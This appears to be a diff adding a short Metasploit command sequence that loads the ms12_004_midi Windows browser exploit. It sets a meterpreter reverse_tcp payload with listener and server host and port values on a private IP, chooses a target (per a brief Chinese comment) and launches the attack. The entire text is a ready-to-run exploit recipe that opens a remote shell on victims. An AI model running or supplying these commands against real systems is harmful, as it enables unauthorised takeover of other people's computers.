@@ -1,0 +1,11 @@
+search ms12_004
+show options
+use exploit/windows/browser/ms12_004_midi
+set payload windows/meterpreter/reverse_tcp
+set SRVHOST 192.168.2.128
+set SRVPORT 8085
+set LHOST 192.168.2.128
+set LPORT 1216
+show target
+set target 1  (对型号选择id攻击)
+exploit
